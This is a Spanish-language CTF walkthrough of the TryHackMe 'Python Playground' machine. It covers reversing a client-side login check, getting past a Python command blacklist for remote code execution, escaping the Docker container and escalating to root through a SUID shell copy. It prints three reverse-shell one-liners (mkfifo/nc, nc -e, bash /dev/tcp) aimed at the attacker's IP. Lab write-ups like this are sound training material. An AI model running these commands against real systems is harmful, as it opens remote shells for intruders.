---
layout: single
title: Python Playground - TryHackMe
excerpt: "Debemos encontrar 3 banderas. Primero, a partir de un escaneo de puertos pude saber que un servidor web se estaba ejecutando en el puerto 80 y que se utilizaba la tecnología Node.js y Express para desplegar una aplicación web. Luego, utilice fuerza bruta de directorios en el directorio raíz del servidor, logrando obtener un login exclusivo para el admin. Además, aprovechando que la lógica de este login se había implementado en un script JavaScript, cree un script JavaScript para realizar un proceso inverso al implementado en la lógica del login para codificar la contraseña, logrando obtener omitir la autenticación, y en el panel de gestión había una funcionalidad que te permitía ejecutar código Python pero se había implementado un blacklist con ciertos comandos, aun así se logro evitar el blacklist logrando ejecutar una reverse Shell, logrando acceder a un contenedor Docker, pero para acceder al sistema anfitrión se reutilizo las contraseñas usadas en el login mediante el servicio SSH. Luego, en la escalada privilegio, aproveche un directorio montado en el contenedor Docker para genera una copia del binario sh con el bit SUID habilitado."
date: 2023-12-17	
classes: wide
header:
  teaser: /assets/images/Docker/image002.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - SSH
  - Fla
  - RCE
  - SSTI
  - Python
  - HTTP
  - HTML
  - MySQL
  - Flask
  - Logstash
  - Linpeas
  - Gobuster
---

![](/assets/images/Docker/image001.png)

## SUMMARY

Debemos encontrar 3 banderas. Primero, a partir de un escaneo de puertos pude saber que un servidor web se estaba ejecutando en el puerto 80 y que se utilizaba la tecnología Node.js y Express para desplegar una aplicación web. Luego, utilice fuerza bruta de directorios en el directorio raíz del servidor, logrando obtener un login exclusivo para el admin. Además, aprovechando que la lógica de este login se había implementado en un script JavaScript, cree un script JavaScript para realizar un proceso inverso al implementado en la lógica del login para codificar la contraseña, logrando obtener omitir la autenticación, y en el panel de gestión había una funcionalidad que te permitía ejecutar código Python pero se había implementado un blacklist con ciertos comandos, aun así se logro evitar el blacklist logrando ejecutar una reverse Shell, logrando acceder a un contenedor Docker, pero para acceder al sistema anfitrión se reutilizo las contraseñas usadas en el login mediante el servicio SSH. Luego, en la escalada privilegio, aproveche un directorio montado en el contenedor Docker para genera una copia del binario sh con el bit SUID habilitado.

## FASE RECONOCIMIENTO ACTIVO

En este caso debemos acceder al sistema destino y obtener dos banderas. Primero, empezaremos utilizando el comando openvpn y el archivo de configuración OpenVPN con el fin de establecer una conexión VPN y poder acceder a los laboratorios donde están las máquinas virtuales y vulnerables.

![](/assets/images/Docker/image003.png)

Además, la plataforma de Tryhackme nos muestra la dirección IP de la máquina Python Playground.

![](/assets/images/Docker/image004.png)

## FASE ESCANEO Y ENUMERACION

Ahora pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del sistema destino. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo del sistema destino.

![](/assets/images/Docker/image005.png)

Los resultados que obtenemos son:
- Un programa servidor SSH que se ejecuta en el puerto 22.
- Un servidor que se ejecuta en el puerto 80 y que ha sido creado utilizando Node.js y el framework Express, por lo que, lo mas probable es que las aplicaciónes web alojada en el servidor, hayan sido desarrolladas utilizando codigo JavaScript.

Ahora accederemos al directorio raiz del servidor web.

![](/assets/images/Docker/image006.png)

![](/assets/images/Docker/image007.png)

![](/assets/images/Docker/image008.png)

Podemos observar en las paginas web de la aplicación web que se esta ofreciendo un servicio donde los usuarios puedan ejecutar codigo Python de manera segura implementando medidas de seguridad como un blacklist con el fin de restringir ciertos comandos que puedan vulnerar la seguridad del sistema destino. Ademas, las funcionalidades para registrar una cuenta y para autenticarse a traves del login, estan deshabilitadas.

Ahora realizaremos fuerza bruta de directorios sobre el directorio raiz del servidor web para encontrar recursos escondidos.

![](/assets/images/Docker/image009.png)

![](/assets/images/Docker/image010.png)

![](/assets/images/Docker/image011.png)

![](/assets/images/Docker/image012.png)

![](/assets/images/Docker/image013.png)

Podemos observar que nos encontramos con un recurso escondido que viene a ser el login destinado para el admin, que al parecer viene a ser Connor. Ademas, vemos que la logica implementada en la autenticacion del login esta escrita en un script JavaScript que poidemos facilmente analizar al observar el codigo fuente de la pagina web.

Ahora desglosaremos los comandos del script JavaScript para entender la logica implementada en la autenticacion:
1. Primero se tomara el valor alamcenado en el elemento HTML cuyo atributo id viene a ser username y se comparara con el string connor, y si no hay coincidencia se generara un elemento HTML con el atributo id igual a fail y mostrara un mensaje de error.
2. En ell caso de que el username sea igual a connor, se tomara el valor almacenado en el elemento HTML cuyo atributo id viene a ser inputPassword, y sera procesado a traves de dos funciones llamados int_array_to_text y string_to_int_array.
3. La funcion string_to_int_array va utilizar el metodo charCodeAt para representar cada carácter del password ingresado en su valor Unicode. Luego, a cada valor Unicode se le dividira entre 26 y se aplicara la funcion Math.floor para redondear el resultado decimal a un numero entero mas bajo que el original, y el resultado sera almacenado en una varaible. Ademas, el resultado de la division tambien sera almacenado en otra variable. Luego, cada variable sera almacenado en un arreglo.
4. La funcion int_array_to_text va utilizar el metodo String.fromCharCode para convertir cada valor entero almacenado en el arreglo obtenido anteiormente en un carácter y luego juntara todo los caracteres en un string.
5. Luego de aplicar dos veces cada funcion, se obtendra un string que sera comparado con un string definido en un condificional if, y si son iguales, seremos redirigidos a un documento HTML que al parecer viene a ser un panel de gestion exclusivo para el admin Connor. Caso contrario, se generara un elemento HTML con el id igual a fail y que contendra un mensaje de error.

Ahora que ya entedemos lo que hace el script JavaScript, crearemos un script JavaScript para que el string sea convertido en su forma base. Para ello implementaremos dos funciones que realizan una funcion inversa a las dos funciones definidas en el script JavaScript en la logica de la autenticaicon.

![](/assets/images/Docker/image014.png)

![](/assets/images/Docker/image015.png)

![](/assets/images/Docker/image016.png)

De esta manera logramos obtener las credenciales del admin Connor, y nos autenticamos exitosamente en login, y somos redirigidos a la pagina HTML` super-secret-admin-testing-panel`(según lo previsto al analizar el script JavaScript) logrando acceder a un portal donde podemos ejecutar comandos Python.

Ahora intentaremos ejecutar comandos en el sistema operativo del sistema destino utilizando ciertos modulos de Python.

![](/assets/images/Docker/image017.png)

![](/assets/images/Docker/image018.png)

![](/assets/images/Docker/image019.png)

![](/assets/images/Docker/image020.png)

![](/assets/images/Docker/image021.png)

![](/assets/images/Docker/image022.png)

Podemos observar que se ha implementado un blacklist con el fin de restringir el uso de la instruccion import en su forma mas comun, la funcion eval, y el modulo os con sus metodos, pero el modulo subprocess y sus metodos no han sido especificados en el blacklist, por lo que pudimos ejecutar el comando whoami exitosamente. De esta manera comprobamos que esta funcionalidad es vulnerable a RCE.

Ahora lo mas logico seria ejecutar un comando que nos genere una reverse shell, pero no tuve suerte en obtener una reverse shell probando los siguientes payloads:

```
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.123.194 1800 >/tmp/f
- nc 10.8.123.194 1800 -e bash
- bash -i >& /dev/tcp/10.8.123.194/1800 0>&1
```
Aprovechando que puedo ejecutar comandos remoto con los privilegios de root, voy a crear un script Shell en el directorio raiz de la aplicación web, y le asignare el permiso de ejecucion, y le introducire un comando que nos genere una reverse shell. Luego, lo ejecutare para obtener mi reverse shell.

![](/assets/images/Docker/image023.png)

![](/assets/images/Docker/image024.png)

![](/assets/images/Docker/image025.png)

![](/assets/images/Docker/image026.png)

![](/assets/images/Docker/image027.png)

![](/assets/images/Docker/image028.png)

De esta manera obtenemos accesso al sistema destino siendo el usuario root, pero nos damos cuenta que en el directorio raiz existe el archivo oculto dockerrenv y los procesos ejecutados en el sistema son muy pocos por lo que todo indica que viene a ser un contenedor Docker al que hemos logrado acceder. Ademas, logramos obtener la primera bandera en el directorio root.

![](/assets/images/Docker/image029.png)

Luego, de enumerar de manera manual en el sistema de archivos de este contenedor Docker me encontre con un directorio montado en el directorio mnt, que viene a ser como punto temporal de montaje de sistema de archivos, pero solo contiene archivos de registros sin ningun credencial o informacion sensible.

![](/assets/images/Docker/image030.png)

![](/assets/images/Docker/image031.png)

De esta manera logre obtener accesso al sistema anfitrion mediante la reutilizacion de las contraseñas del usuario Connor. Ademas, logre encontrar la segunda bandera en su directorio home.

Ahora buscaremos en el sistema de archivos del sistema anfitrion la ruta del directorio que ha sido montado en el directorio mnt del contenedor Docker.

![](/assets/images/Docker/image032.png)

Ahora haremos una copia del archivo binario sh con el bit SUID habilitado en el directorio montado en el contenedor Docker, con el fin de saber si los permisos del archivo binario se conservan en el sistema de archivos del sistema anfitrion, y saber quien es el propietario y cual es el grupo primario.

![](/assets/images/Docker/image033.png)

![](/assets/images/Docker/image034.png)

![](/assets/images/Docker/image035.png)

Podemos observar que nuestra hipotesis fue acertada, y se logro conservar el bit SUID en el archivo binario sh en el directorio log montado. Debido a esto es que pude ejecutar una shell sh con los privilegios de root.

Ahora solo falta encontrar la ultima bandera en el directorio root de root.

![](/assets/images/Docker/image036.png)































